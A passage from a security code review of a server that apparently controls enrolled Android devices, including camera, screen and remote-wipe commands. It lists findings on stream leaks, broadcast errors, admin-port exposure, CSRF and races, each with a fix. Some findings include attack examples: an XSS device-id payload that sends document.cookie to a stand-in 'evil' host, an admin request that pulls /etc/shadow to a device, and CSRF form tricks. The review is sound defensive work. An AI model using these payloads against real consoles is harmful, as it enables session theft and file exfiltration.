**Failure:** A device starts a stream, sends one frame, and stops sending without `stream_end` while its connection stays alive (stream thread crashed, or a malicious device). `drop_device` does not run because the device is still connected. `stream_frame` and `/stream/<id>/feed` continue to serve the frozen frame; the console's MJPEG feed shows a static image and the operator believes it is live. The cache slot also stays occupied.

**Smallest fix:** in `latest`/`stream_frame`, ignore frames older than a short TTL (e.g., 10-15s for live streams); or add a periodic sweep. A one-condition check in `latest` is the smallest.

### D3. `MAX_STREAMS=3` + 2 frames/stream allows cache monopolization and large memory — **Medium, Hardening**
`daemon.py` `StreamCache` constants (lines 187-188) and `put`/`set_encoding` (lines 197-225).

**Failure:** One device runs screen + cam + mic (3 streams), filling the cache; a fourth stream or another device evicts the least-recently-updated stream. A malicious approved device sends 32 MiB frames (the websocket `max_size`); 6 cached frames can hold ~192 MiB. One device can evict all other devices' streams. The cache is bounded but the bound is large and unfair.

**Smallest fix:** cap streams per device (e.g., one or two) or make eviction fair per device; optionally cap the accepted frame payload size in `put`. Raising `MAX_STREAMS` without per-device caps worsens memory; the per-device cap is the targeted fix.

### D4. Pending/unapproved devices can fill and serve the stream cache — **Medium, Confirmed/Design**
`daemon.py` `on_device_binary` (lines 451-460), `stream_start`/`stream_end` (lines 547-551); `admin_dispatch` "stream_frame" (lines 639-647).

**Failure:** An unapproved device that enrolled with the enroll key sends `stream_start`/frames. The cache stores them without checking `self.approved(device_id)`. The authenticated console can open `/stream/<id>` for the pending device and see its camera/screen feed; the device can evict approved devices' streams. A pending device's frames are also served by `stream_frame` to the CLI/console.

**Smallest fix:** gate stream caching and `stream_frame` on `self.approved(device_id)` (or pass the hello's approved flag into the handler and check it); optionally allow an explicit admin "view pending" flag. Small.

### D5. `stream_mjpg` leaks a thread and hangs when there are no frames — **High, Confirmed**
`console.py` `stream_mjpg` (lines 479-504); `page_stream` (lines 309-325).

**Failure:** An operator opens `/stream/<id>` for a device with no active stream, or after the device goes offline. The handler sends `200` headers immediately, then loops: `_fetch_frame` returns `(None, error)`, so no write occurs, only `time.sleep(0.3)`. When the operator closes the tab, the server never writes to the socket, so it never gets `BrokenPipe`/`ConnectionReset`; the loop continues forever, opening a new admin connection 3-5 times per second. Repeated tabs/streams exhaust threads and admin connections. The page's `onerror` handler never fires because the connection stays open, so the UI does not recover/retry correctly.

**Smallest fix:** fetch the first frame *before* sending headers and return 503 if none; after headers, send a periodic heartbeat/comment part (or close after an idle timeout, e.g., 10s) so a dead socket raises; set a socket write timeout; and cap concurrent MJPEG clients. These are small, local changes.

### D6. Stream clients are unauthenticated at the resource layer and unbounded — **Medium-High, Confirmed**
`console.py` `do_GET` `/stream/...` (lines 384-391), `stream_mjpg` (479-504); `_authed`/`_check` (344-365).

**Failure:** The only gate is the one-time Basic auth check. An authenticated or CSRF-driven client (e.g., a malicious page embedding `<img src="http://127.0.0.1:9443/stream/x/feed.mjpg">` with cached credentials) can open many streams for arbitrary device ids. Each starts a thread and polls the daemon; non-existent devices still loop forever (D5). This is a thread/connection exhaustion DoS.

**Smallest fix:** validate the device exists/online/approved before streaming; cap concurrent `stream_mjpg` clients (module-level semaphore/counter, return 503 when full); add the idle timeout/heartbeat from D5. Small.

### D7. Per-poll base64 encode and admin connection churn — **Medium, Hardening/Performance**
`daemon.py` "stream_frame" (lines 639-647); `console.py` `_fetch_frame` (lines 458-467), `stream_mjpg` (490-501); `ghostctl.py` `rpc` (lines 59-72).

**Failure:** Every MJPEG poll calls `ghostctl.rpc`, which opens a new TCP connection to the admin port; the daemon base64-encodes the frame on every call. At ~5 fps per viewer, that is 5 connections/sec and repeated multi-MB base64 encoding/decoding per viewer. With several viewers, the admin port and CPU are saturated; the daemon's admin handler creates a task per connection. A large 32 MiB frame becomes a ~43 MB JSON string per poll.

**Smallest fix:** cache the base64 string alongside the payload in `StreamCache` (encode once at `put`), and/or reduce the poll rate/reuse a single admin connection per stream. A small cache field in `StreamCache.put` is the least invasive.

---

## E. Broadcast behavior

### E1. Top-level `ok` is always true for broadcasts — **Medium-High, Confirmed**
`daemon.py` `broadcast` (lines 361-373) and "command" all branch (lines 655-657); `ghostctl.py` `main` (lines 218-222); `console.py` `page_cmd_result` (lines 283-293).

**Failure:** A broadcast to online approved devices where every send fails, times out, or the action is unknown returns `{"ok": true, "broadcast": true, "results": {device: error/entry}}`. The CLI checks only the top-level `ok` and exits 0; the console's `page_cmd_result` shows "OK". An operator broadcasting `destroy` or `disarm` to all devices sees success even though nothing was delivered. An unknown action also yields per-device errors with top-level `ok: true`.

**Smallest fix:** in the broadcast branch, compute a summary from the results (failed/timeout/exception count) and expose `failed`/`all_ok`; set the top-level `ok` to false when all failed (or when any failed, if strict). Validate the action once against `ACTIONS` before gathering and return a clean error for unknown actions. Have the CLI/console use the summary. Small.

### E2. Broadcast UI includes `destroy` and server-side-only verbs; generic confirm — **Medium, Confirmed**
`console.py` `page_broadcast` (lines 296-306), `VERBS`/`DEVICE_FORMS` (lines 63-114), `do_POST` broadcast (lines 448-453).

**Failure:** The `/broadcast` select is built from all `VERBS`, including `destroy`. The confirm text only says "broadcast to ALL online devices?"; unlike the device page, `DANGEROUS`/`destroy` is not handled specially. One click + confirm wipes every online approved device. The select also includes `update` (and other server-side-only verbs) whose daemon-side flow is not invoked by a bare command broadcast; the operator gets a misleading or failed result. (I am not detailing file-transfer verbs per the exclusion.)

**Smallest fix:** exclude `destroy` from the broadcast options (or require a typed device count/confirmation); route `update` through the admin `"update"` op or remove it from the generic broadcast/device forms. These are small mappings, not new features.

### E3. Broadcast has no send timeout, no concurrency limit, and no dedupe — **High, Confirmed/Performance**
`daemon.py` `broadcast` (lines 361-373) and `dispatch` (lines 348-358).

**Failure:** A broadcast to many devices creates one task and two full history rewrites per device. A single stalled device's `ws.send` blocks the whole `gather` forever (B3). A double-click or duplicate admin request sends the same destructive command twice; there is no idempotency key or in-flight dedupe. With a large approved-device set (approved count is not capped), memory/CPU/disk scale with device count.

**Smallest fix:** wrap sends in the B3 timeout; cap concurrency with a semaphore (e.g., 16) and batch history persistence; add a per-device in-flight guard or a one-time form token to reduce duplicate submits. The timeout and batch persistence are the smallest first steps.

### E4. Broadcast silently skips offline approved devices — **Low, Hardening**
`daemon.py` `broadcast` targets (lines 363-366).

**Failure:** An operator broadcasts "disarm" or "screen stop" to all; offline approved devices are omitted from both the command and the results. The operator has no indication that some devices did not receive it. There is no queue for later delivery.

**Smallest fix:** include offline approved devices in the results as `{"status": "offline", "skipped": true}` so the operator sees coverage. A queue would be a new feature; the result annotation is small.

### E5. `--all update` does not broadcast and the console update form bypasses the server-side update flow — **Medium, Confirmed**
`ghostctl.py` `main` update path (lines 207-213); `daemon.py` "update" branch (lines 648-651); `console.py` `DEVICE_FORMS` update entry (line 105) and `rpc_command` (lines 155-158).

**Failure:** `ghostctl.py --all update` sends `{"op":"update","device_id":null,...}` without `"all":true`. The daemon's update branch calls `update_push(None,...)`; `_push_file`/`conns.get(None)` yields "device None is offline". The docstring at line 27 claims `--all update # broadcast`. Separately, the console's `update` form sends a bare `{"op":"command","action":"update",...}`, so the daemon's server-side update flow (APK selection + install trigger) is never used; the device receives a plain update command instead. The same mismatch applies to a broadcast "update" from the console.

**Smallest fix:** either handle `all=True` in the daemon's "update" branch by gathering `update_push` per approved online device (similar to `broadcast`), or reject `--all update` with a clear error and remove the docstring claim; route the console's `update` form to the `"update"` op. These are small changes; do not add a new update protocol.

### E6. Concurrent commands to the same device are not serialized — **Medium, Hardening/Confirmed race**
`daemon.py` `dispatch` (lines 334-359); no per-device lock (only `push_lock` for pushes, line 290/385).

**Failure:** An operator sends `screen live` and `screen stop` from two tabs/CLI invocations concurrently. The device receives both in an arbitrary order; the stop may arrive before the live starts or the device's CommandHandler may mishandle overlapping commands. The stream keeps running or the stop is lost. `destroy` and `status` similarly race.

**Smallest fix:** a per-device `asyncio.Lock` (or a short command queue) around `dispatch`, with care not to hold it across a long-lived live command indefinitely (or document that live commands are not serialized). A per-device lock is a small change; a full queue/prioritization would be a new feature.

---

## F. Admin/console authentication and exposure

### F1. Admin port has no authentication and leaks device tokens — **High, Confirmed**
`daemon.py` `admin_handler` (lines 569-586), `admin_dispatch` "list"/"pending" (lines 591-595); `ghostctl.py` `rpc` (lines 59-72); `console.py` `rpc_devices`/`rpc_command`/`rpc_broadcast` (lines 155-168).

**Failure:** Any local process (or anyone if `--admin-host 0.0.0.0` is used) connects to `127.0.0.1:8444` and sends JSON. The port accepts `list`, `pending`, `approve`, `revoke`, `rename`, `config set`, `command` (including `destroy`), and `update`. `list` returns `self.devices` including each device's `"token"`; `pending` returns pending records including their tokens. A local unprivileged user can read every device's bearer token and impersonate devices, or send `destroy`/`camera capture` commands without knowing the console password. The console's Basic auth is bypassed entirely for local users. The admin port is plaintext.

**Smallest fix:** require a shared admin secret on every request (`GHOSTCTL_ADMIN_TOKEN` in `.env`, checked in `admin_handler`; CLI/console include it) and refuse a non-loopback `--admin-host` without the secret. At minimum, strip `"token"` from `list`/`pending` responses (`device_list` copy without token) and keep the port loopback-only. These are small changes; the token check is the real fix. Also see F2 for the `update` apk path.

### F2. Admin `update` op accepts an arbitrary local APK path — **Medium-High, Confirmed exposure**
`daemon.py` `admin_dispatch` "update" (lines 648-651) and `update_push` (lines 427-448).

**Failure:** A local/authenticated client sends `{"op":"update","device_id":"<device they control>","target":"self","apk":"/etc/shadow"}`. `update_push` expands the path and uses it as the source; the file is delivered to the device. This turns the unauthenticated admin port into an arbitrary local-file exfiltration path. (The transfer mechanics are in the excluded area; this finding is about path authorization.)

**Smallest fix:** restrict `apk` to `APK_DIR` (or a configured allowlist) and reject paths with traversal; combine with F1's admin auth. If arbitrary `--apk` must remain, require admin authentication and document the risk.

### F3. Console POST endpoints have no CSRF protection — **High, Confirmed**
`console.py` `do_POST` (lines 398-455), `_authed`/`_check` (344-365).

**Failure:** The operator has authenticated; the browser caches Basic credentials for the console origin. They visit a malicious page that auto-submits a form to `http://127.0.0.1:9443/device/<id>/cmd` with `verb=destroy`, or to `/device/<id>/revoke`, `/device/<id>/approve`, `/device/<id>/rename`, or `/broadcast`. The browser attaches the cached Authorization header; the server executes the action. The HTML confirm dialogs are bypassed because the attacker's form does not use them. A CSRF approve is a privilege escalation for an attacker's pending device; a CSRF destroy wipes devices. The server checks no `Origin`, `Referer`, or token.

**Smallest fix:** reject POSTs whose `Origin` (or, if absent, `Referer`) is present and not same-origin; or add a per-session CSRF token in a `SameSite=Strict` cookie plus a hidden form field. The Origin check is the smallest immediate mitigation; the token is more robust. Also protect GET `/stream/...` (F4/D6) since it has resource side effects.

### F4. GET `/stream/.../feed.mjpg` is a long-lived, CSRF-reachable resource sink — **Medium-High, Confirmed**
`console.py` `do_GET` (lines 384-391), `stream_mjpg` (479-504).

**Failure:** A malicious page embeds many `<img src="http://127.0.0.1:9443/stream/<id>/feed.mjpg">` tags. With cached Basic credentials, the browser opens many long-lived MJPEG connections. Each consumes a thread and polls the daemon; non-existent devices loop forever (D5). This is a CSRF-driven DoS and an information side-channel (the attacker cannot read the image, but can cause load and potentially infer activity via timing).

**Smallest fix:** the D5/D6 fixes (pre-check, idle timeout, heartbeat, concurrency cap) plus an Origin/Referer check or a token in the stream URL. A concurrency cap is the smallest effective mitigation.

### F5. XSS via `device_id` in inline `onclick` confirms — **High, Confirmed**
`console.py` `page_device` destroy/revoke confirms (lines 245-247, 275-276); `daemon.py` `handle_hello` (line 471) allows arbitrary device ids.

**Failure:** An attacker sends an unauthenticated hello (A4) with `device_id` = `x');fetch('//evil/?'+document.cookie);//` (or a backslash-based payload). The empty record appears in the device list as a pending device. The operator opens its page and clicks "Revoke" (a natural action for a suspicious pending device). The code builds `onclick="return confirm('revoke <e(did)>? token is rotated')"`. `html.escape` converts `'` to `&#x27;`; the HTML parser decodes it back to `'` in the attribute value before the JS engine parses it, terminating the single-quoted JS string and executing the injected JS in the console origin. The attacker can then issue commands via the console's authenticated session. The destroy confirm is the same. (The `value='...'` attribute is not exploitable this way because its decoded quotes are just data, not JS.)

**Smallest fix:** build the JS argument with `json.dumps(...)` and HTML-escape the whole attribute, e.g. `onclick="return confirm(%s)" % e(json.dumps(f"destroy {did}? ..."))`; or use a data attribute and `addEventListener`. Also validate `device_id` to a safe charset (A4) to remove the attack surface. Both are small; the `json.dumps` fix is the direct one.

### F6. Basic auth over cleartext; password printed to stdout; `.env` readable — **Medium-High, Confirmed/Hardening**
`console.py` `PASSWORD` (line 116), `main` (lines 507-523), `.env` loader (lines 48-55); `_authed` (344-353).

**Failure:** The console is started with `--host 0.0.0.0`; Basic credentials travel in cleartext. The generated password is printed to stdout (line 517), so if output is redirected to a log/journal, any local reader gets it. `.env` is `664` (C3), so a group user can read `GHOST_CONSOLE_PASS` and `GHOST_ENROLL_KEY`. There is no rate limit or lockout on failed auth; a network attacker can brute-force the password. The username field is ignored, so there is no per-user attribution for destructive commands.

**Smallest fix:** require TLS (reverse proxy) for non-loopback binds and document it; chmod `.env` 600 (C3); write a generated password to a 600 file or require `GHOST_CONSOLE_PASS` instead of printing; add a per-IP failure counter/backoff. These are deployment+small-code changes. The lack of per-user attribution is a design limitation; at minimum log the client address with each POST.

### F7. Clickjacking and missing security headers — **Medium, Hardening**
`console.py` `_send` (lines 335-342), `_check` (355-365).

**Failure:** A malicious site frames the console (if reachable) and overlays a transparent "Revoke"/"destroy" button; the operator clicks and the action executes. The server sends no `X-Frame-Options`/CSP/`nosniff`. Basic auth may still be attached to the framed request.

**Smallest fix:** send `X-Frame-Options: DENY`, `Content-Security-Policy: frame-ancestors 'none'`, and `X-Content-Type-Options: nosniff` from `_send`/`_check` (including 401s). Small.

### F8. No auth timeout on device connections; pre-hello resource use — **Medium-High, Confirmed/Hardening**
`daemon.py` `device_handler` (lines 506-537); `run` `websockets.serve` (lines 668-669).

**Failure:** An attacker opens many websockets from many IPs and sends nothing. The server's `async for` waits indefinitely; the websocket keepalive pings are answered by the attacker's client. Each connection holds a task, buffers, and an `ip_conns` count. The per-IP limit only bounds per IP; many IPs grow memory/FDs. A pre-hello client can also send repeated 32 MiB text frames; the server calls `json.loads` on each (line 512), consuming CPU/memory. The auth timeout would also bound A4/A5 churn.

**Smallest fix:** require the first message to be a hello within N seconds (e.g., `await asyncio.wait_for(ws.recv(), timeout=10)` for the first message, or a timer task that closes non-hello connections); reduce `ping_interval`/`ping_timeout`; pre-hello, drop messages larger than a small threshold before parsing. Small.

### F9. No TLS on device port (`ws://`) and shared global enroll key — **High if internet-exposed, Hardening**

> **Status 2026-10-26:** TLS portion resolved. The device port is WSS-only for
> non-loopback binds, with SPKI pinning/system-CA trust and online token
> rotation. The enrollment key is still a shared compiled value; rotate it with
> a matching app build.
`daemon.py` `main` default `--bind 0.0.0.0` (line 678), `run` (lines 668-669), `handle_hello` enroll comparison (lines 479-480).

**Failure:** The device port binds all interfaces by default without TLS. A passive network attacker captures a device's hello, obtaining its token or the enroll key. The enroll key is a single global secret; possession allows enrolling new devices (subject to the corrected MAX_PENDING) and triggering the enroll-key de-approval path (A8) against approved devices. There is no per-device binding or key rotation in the protocol.

**Smallest fix:** document/require a TLS terminator (`wss://`) for non-loopback device deployments; keep the device port on a VPN/loopback where possible; rotate the enroll key; consider per-device enrollment tokens as a longer-term design change. The TLS/rotation part is deployment; no protocol change is required for the minimal fix.

### F10. Request-size and concurrency limits are absent on the console — **Medium-High, Confirmed**
`console.py` `_body_qs` (lines 367-369), `ThreadingHTTPServer` (line 514), `_send` (335-342).

**Failure:** An authenticated or CSRF/local client sends a POST with `Content-Length: 1000000000` (or a negative value); `self.rfile.read(n)` blocks/allocates. A malformed `Content-Length` (`abc`) raises `ValueError` and closes the thread with a traceback; a negative value causes `read(-1)` to block until EOF. Separately, `ThreadingHTTPServer` spawns an unbounded thread per request/stream; a flood exhausts threads/memory. `_send` writes to a possibly slow client without a timeout.

**Smallest fix:** validate and cap `Content-Length` (e.g., reject <0 or >1 MiB with 413), catch `ValueError`; add a request/stream concurrency semaphore; set a socket write timeout for long responses. Small.

### F11. Missing attribution for destructive actions — **Low-Medium, Hardening**
`console.py` `do_POST` (lines 398-455); `daemon.py` `admin_dispatch` (lines 588-662); history entries (lines 346-348).

**Failure:** The console's username is ignored; the history entry records only device/action/args, not the client address or operator. A destructive command from the console/CLI cannot be attributed. A compromised shared password gives no trace of who used it.

**Smallest fix:** include an `"actor"`/`"source"` field in the admin request and history entry (the console can pass its `self.address_string()`); log the POST verb/device with the client address. Small; no protocol redesign.

### F12. Admin request type/line-length validation and drain blocking — **Low-Medium, Confirmed/Hardening**
`daemon.py` `admin_handler` (lines 569-586).

**Failure:** A local client sends a JSON array/string; `admin_dispatch`'s `req.get("op")` at line 589 runs *before* the try at 590 and raises `AttributeError`, which the `except (ConnectionResetError, BrokenPipeError)` does not catch; the handler crashes. A line over asyncio's 64 KiB `readline` limit raises `ValueError`, also uncaught. A client that sends a request and does not read the response can block `writer.drain` (line 582), holding the handler task; many connections grow tasks/memory.

**Smallest fix:** validate `isinstance(req, dict)` and catch `ValueError`/`AttributeError` in `admin_handler`, returning a JSON error; wrap `writer.drain()` in `asyncio.wait_for(..., timeout=5)` and close on timeout. Small.

### F13. Information disclosure via server headers/logs — **Low, Hardening**
`console.py` `Handler.server_version` (line 329); `daemon.py` `log` (lines 143-154).

**Failure:** The console's default `sys_version` advertises the Python version; the daemon's `log` writes device-supplied `device_id`/`name` unescaped to stdout/`daemon.log`, allowing log-line injection via newlines. A denial flood (many IPs) fills the log to 512 KB and triggers repeated synchronous read/rewrite trims (lines 148-150), blocking the event loop.

**Smallest fix:** set `sys_version = ""`; sanitize/truncate device ids/names in log lines; throttle denial logs per IP/time or use a rotating handler. Small.

### F14. Directory/script writability enables code execution — **High, Confirmed exposure**
`server/` directory mode `775`; `console.py` `sys.path.insert(0, BASE)` and `import ghostctl` (lines 56-57); `daemon.py` module load.

**Failure:** A group user with write access to `server/` can replace `ghostctl.py`, `daemon.py`, or `console.py`, or delete/replace `enroll.key`/`state.json`. On the next daemon/console start, the attacker's code runs as the service user; or the attacker's enroll key takes effect. The observed directory is `775` (group write).

**Smallest fix:** chmod the directory to `700`/`750` and the scripts to `600`/`640`; optionally have the daemon/console refuse to start if `BASE` or `.env` is group/world-writable. Deployment+small check.

---

## G. Reconnect-induced races (unique items; many are cross-referenced above)

### G1. Reconnect vs. command send TOCTOU — **Medium, Confirmed**
`daemon.py` `dispatch` (line 340 gets `ws`; line 350 sends); `device_handler` replacement (line 527).

**Failure:** `dispatch` captures `ws = self.conns.get(device_id)`, then awaits. A reconnect replaces `conns[device_id]`. The command is sent to the old ws (possibly closed → B2 leak; possibly alive but the device no longer reads it → B1 timeout). The device may execute on the new connection or not at all. The operator sees a timeout or a false success.

**Smallest fix:** immediately before sending, re-check `self.conns.get(device_id) is ws` (and `self.approved(device_id)`); if not, raise `ConnectionError` and let the caller retry on the new connection. Closing the old ws on replacement (A1) plus the message guard (A2) covers the rest.

### G2. Reconnect vs. state/registration ordering — **Medium, Confirmed**
`daemon.py` `device_handler` (lines 519-534); `handle_hello` (465-493).

**Failure:** Covered in A7: the decision is made before the ack send; the touch/registration happen after; two hellos can interleave and leave a non-deterministic `approved`/`token`/`conns` state. A command in the gap sees stale state or the wrong ws.

**Smallest fix:** A7's reordering — apply the decision and register synchronously before the ack send, close the old ws. Also A8's approved-enroll policy removes the approved/pending flip.

### G3. Revoked device's active connection remains and can still emit messages — **Medium-High, Confirmed**
`daemon.py` "revoke" (lines 612-620); `device_handler` message branches (539-558).

**Failure:** Covered in A6: after revoke, the device's ws stays in `conns`; it can send `ping`/`info`/`result`/`stream_*`; its cached stream is served; `online` stays true. The token rotation only affects the next reconnect. A compromised device keeps its live channel until it disconnects.

**Smallest fix:** A6 — pop and close the ws, drop streams. Also A2's guard as defense-in-depth.

### G4. MAX_PENDING check vs. touch race — **Medium, Confirmed**
`daemon.py` `handle_hello` (lines 481-486) and `touch` (528-534).

**Failure:** Even after correcting A5's condition, the limit check happens in `handle_hello`, while the device record is created by the caller's `touch` after the awaited ack send. Two concurrent enrolls can both pass the check before either touch increments the pending count, exceeding the cap. An attacker with the enroll key can amplify this with many concurrent connections.

**Smallest fix:** perform the limit check and the device-record creation synchronously inside `handle_hello` (no `await`s between), and have the caller only update online/battery/IP. Or accept a small overage but enforce the cap at the next enroll. The atomic update is the targeted fix.

### G5. Stale `online`/`last_seen` from zombie pings/infos — **Low-Medium, Confirmed**
`daemon.py` `device_handler` (lines 539-546); `touch` (312-319).

**Failure:** A superseded connection sends `ping`/`info`; the handler calls `touch(device_id, online=None, ...)` and updates `last_seen`/battery/IP. The console shows fresh activity from a connection that is no longer the device's active one. A device that reconnects with a changed IP can have its displayed IP overwritten by the old connection's stale `info`.

**Smallest fix:** A2's current-ws guard for `ping`/`info` (or close the old ws in A1). Also consider using the connection's observed IP rather than the device-reported `msg["ip"]` for display; the reported value is spoofable.

---

## H. Unbounded resource growth (cross-references and unique items)

Already detailed:
- `self.devices` phantom growth: **A4** (High).
- Pending device growth via the inverted cap: **A5** (High).
- `self.pending` leaks: **B1/B2/B4** (High).
- `history.json`/`self.history`: **C1/C2** (High).
- `state.json` writes on every ping: **C4** (High).
- `self.conns` zombies: **A1/A3** (Medium-High).
- Stream cache memory/monopolization: **D3** (Medium).
- Stream thread/admin-connection churn: **D5/D6/D7** (High/Medium).
- Broadcast task/history amplification: **E3** (High).
- Admin/console task/thread growth: **F8/F10/F12** (Medium-High).
- Device connection task/buffer growth pre-hello: **F8** (Medium-High).

### H1. Approved-device count is uncapped and drives broadcast/console cost — **Medium, Hardening**
`daemon.py` `broadcast` (lines 363-369), `device_list` (321-322); `console.py` `page_devices` (196-228).

**Failure:** The pending cap does not cap *approved* devices. An operator (or an attacker who gets approvals via CSRF F3/A5) can accumulate many approved devices. Every broadcast creates a task per device and two history writes per device; the console's device list renders all records; `pending_ids()` and `device_list` become large. Memory/CPU/disk scale with approved count.

**Smallest fix:** add an approved-device cap or require explicit pruning; cap broadcast concurrency (E3); keep the device list paginated in the console (a small change) or cap the returned list. The broadcast concurrency cap is the smallest immediate mitigation.

### H2. Device message field validation failures cause connection churn — **Low-Medium, Confirmed**
`daemon.py` `device_handler` (lines 511-514, 551-554); `on_device_binary` (451-460); `StreamCache.put/drop` (210-225, 247-248).

**Failure:** A compromised/approved device sends a message whose `type` is not a string (ignored, fine), or a `result` with an unhashable `cmd_id` (e.g., a dict), or a frame header with a non-string `stream` (list/dict). `self.pending.pop(dict)`/`self.streams.put(list)` raises `TypeError`; the device handler crashes and the connection closes. Repeated malformed messages cause reconnect churn; a flapping device can hit the per-IP limit (A3) and its commands time out. A non-dict JSON message also causes `msg.get` to raise.

**Smallest fix:** validate `isinstance(msg, dict)`, `isinstance(mtype, str)`, `isinstance(cmd_id, str)`, `isinstance(stream, str)` and length caps; ignore invalid messages rather than crashing. Also guard `handle_hello`'s `hmac.compare_digest` calls against non-ASCII strings (encode to bytes or catch `TypeError`). Small.

### H3. Unbounded response/buffer sizes in CLI/console paths — **Medium, Confirmed/Performance**
`ghostctl.py` `rpc` (lines 66-72); `console.py` `_fetch_frame` (458-467), `page_cmd_result` (283-293); `daemon.py` "stream_frame" (639-647).

**Failure:** The CLI's `rpc` accumulates `buf += chunk` until a newline with no cap; a broadcast returning multiple screen shots or a large `stream_frame` response grows memory. The console's `_fetch_frame` base64-decodes a potentially 43 MB string per poll; `page_cmd_result` dumps the full response (multi-MB base64) into HTML. A daemon bug/version mismatch returning a non-dict or missing `frame_b64` raises `KeyError`/`AttributeError` in the console thread. A partial/empty CLI response raises `JSONDecodeError` with a traceback.

**Smallest fix:** cap response sizes (e.g., reject/truncate above a few MB), handle decode errors cleanly, and truncate/summarize large results in the console display (C2). Small.

---

## Additional lower-severity observations (brief)

- **`ghostctl.py` `rpc`/`main` error handling — Low-Medium, Confirmed.** Non-command ops (`config`, `rename`, `approve`, `revoke`, `pending`, `streams`, `update`) call `emit(rpc(...))` without checking `resp.get("ok")` and without catching `rpc` exceptions; failures exit 0 or print a traceback. The command path checks `ok`, but broadcast's top-level `ok` is always true (E1). Fix: a small `check(resp)` helper and a try/except around `rpc`.
- **`ghostctl.py` `rpc` update timeout — High for update, Confirmed.** The socket timeout is `max(30, wait+15)`; the default `--wait 10` gives 30s, while the daemon's update op can take minutes (B/update flow). The CLI times out and reports failure while the daemon continues; a retry can double-install. Fix: set a longer timeout for `op == "update"` (e.g., `max(400, wait+15)`) and catch timeouts. See E5 for `--all update`.
- **`ghostctl.py` `resolve_device` — Low, Hardening.** It calls `rpc({"op":"list"})`, which returns tokens (F1), and silently falls back to the raw value on ambiguity/error. A typo/ambiguous name sends a command to a non-existent/raw id; the daemon errors. Fix: return an explicit ambiguity error and avoid printing/retaining tokens. Small.
- **`daemon.py` `load_enroll_key` — Low-Medium, Confirmed.** An empty/truncated `enroll.key` is accepted as the key; all enrollments then fail (the `enroll` argument must be truthy and the comparison is against ""). An existing key's permissions are not re-chmodded. The write-then-`chmod(600)` sequence has a brief 644 window. Fix: treat empty as missing and regenerate; `chmod(0o600)` on load; create with `os.open(..., 0o600)`.
- **`daemon.py` `save_json` — Low, Hardening.** Atomic rename is good, but there is no `fsync`; a power loss after rename can lose the last state/history write. Fix: fsync the temp file (and directory) before/after replace.
- **`daemon.py` `run` — Low, Hardening.** The admin server is started before the websocket server; if the device bind fails, the admin server is not explicitly closed (it closes on process exit). Fix: start both and close the admin server in a `finally` on failure.
- **`console.py` `_fetch_frame` — Low, Confirmed.** `base64.b64decode(resp["frame_b64"])` is outside the try; a missing/invalid field raises in the handler thread. Fix: validate `resp` is a dict and the field exists, and catch decode errors.
- **`console.py` URL parsing for device ids — Low-Medium, Confirmed.** Links use `quote(did)` with default `safe="/"`; `/stream/<id>` checks suffixes on the raw path. A crafted device id containing `/feed` or `/feed.mjpg` (possible via A4) is misrouted to another device's feed; ids with spaces/encoded characters produce 404s because the path isn't unquoted. Commands via `/device/.../cmd` still work because the suffix is appended after the id. Fix: `quote(did, safe="")` and `unquote` path components; validate device ids (A4).
- **`console.py` `page_device` history rendering — Low-Medium, Confirmed/Performance.** `json.dumps(h.get("result"))[:400]` builds the entire multi-MB result string before slicing; `h.get("args")` could be a string (malformed admin request) and `' '.join(string)` joins characters. Fix: truncate the result structure before dumping; validate args type. Small.
- **`console.py` `log_message`/`_send` — Low, Hardening.** Slow clients can block writes without a timeout; `_send` doesn't catch broken pipes. Fix: set a socket timeout and catch `BrokenPipeError`.
- **`console.py` server header — Low, Hardening.** Default `sys_version` advertises Python. Fix: `sys_version = ""` or a generic value.
- **`daemon.py` device-reported IP/version — Low, Hardening.** `touch` uses `msg.get("ip")` as the display IP; a device can spoof it. Fix: use the connection's observed IP for display (or mark the reported value as untrusted).
- **`daemon.py` `log` denial flood — Low-Medium, Hardening.** Every denial logs; the 512 KB trim is a synchronous read/rewrite and can run frequently under a multi-IP denial flood. Fix: throttle denial logs per IP/time or use a rotating handler. Also sanitize device ids/names to prevent log injection.
- **`console.py` no per-user attribution — Low-Medium, Hardening.** The username is ignored and history has no actor. Fix: pass/log the client address; optionally accept an `actor` field.
- **`daemon.py` `handle_hello` logging `ws.remote_address[0]` — Low, Hardening.** If `remote_address` is None, the denial log raises and the handler errors. Fix: use the computed `ip` or a guarded `getattr`.
- **`console.py` `_authed` — Low, Hardening.** `base64.b64decode` without `validate=True`; no per-IP auth failure limit. Fix: validate and add backoff. (Constant-time compare is already used.)
- **`daemon.py` `admin_dispatch` request field validation — Low, Confirmed.** `args` can be a string (history/console join weirdness), `"all"` can be a truthy non-bool (unexpected broadcast), `name` has no length cap, `device_id` can be non-str/unhashable. Fix: validate types/lengths at the admin boundary. Small.
- **`daemon.py` `result` handler lacks device binding — Low, Hardening.** `self.pending.pop(cmd_id)` accepts a result from any authenticated connection; a compromised device would need to know another device's 48-bit `cmd_id` (hard), but defense-in-depth. Fix: store `device_id` in the rec and check. Small.
- **`console.py` `load_history` local-file assumption — Medium, Confirmed/Design.** Covered in C7.

---

## Summary by area

- **Connection replacement/cleanup:** A1-A3, A6-A8; G1-G5. The main defects are the unclosed old ws, zombie message processing, revoke not closing, and the per-IP zombie lockout.
- **Pending command timeout/cancellation:** B1-B8. The leaks on timeout/send failure and the missing send timeout are the highest-value fixes.
- **History/state persistence:** C1-C8. Cap/truncate history, batch broadcast writes, fix file permissions, stop persisting on every ping.
- **Stream cache cleanup:** D1-D7. Fix the PCM/JPEG selection bug, add TTL, cap memory/monopolization, and fix the `stream_mjpg` thread leak/frozen feed.
- **Broadcast behavior:** E1-E6. Compute success, remove destroy from broadcast, bound concurrency/timeouts, handle/reject `--all update`, serialize per-device commands or document.
- **Admin/console auth/exposure:** F1-F14. Admin port auth + token redaction is the top item; then CSRF, XSS, file permissions, TLS, request limits.
- **Reconnect races:** A7/A8, G1-G5.
- **Unbounded growth:** A4/A5, B1/B2/B4, C1/C2/C4, D3/D5/D6, E3, F8/F10/F12, H1/H3.

The smallest high-impact set I would apply first: **A4/A5** (stop phantom/pending growth), **B1/B2/B3** (pending cleanup + send timeout), **C1/C2/C3/C4** (history cap/truncate, file modes, no persist-on-ping), **F1** (admin auth/token redaction), **F5** (XSS escaping), **F3** (CSRF Origin check), **A1/A6** (close old/revoked connections), and **D5** (stream idle timeout/heartbeat + cap). These are all localized changes and do not require broad refactors.

# Additional focused review — 2026-10-25

Historical status at initial review: all findings below were unfixed.
Subsequent local changes address findings 3–7 in source; see BACKLOG.md for
current status and verification limits. The original evidence is preserved.
This review inspected transfer plumbing, command status and test entry points;
it is not a fresh exhaustive audit of both Android apps and all server routes.

1. **P1 — `files get` loses all payload bytes** (`server/daemon.py:460-471`).
   The binary handler processes only `type=frame`. Download chunks use
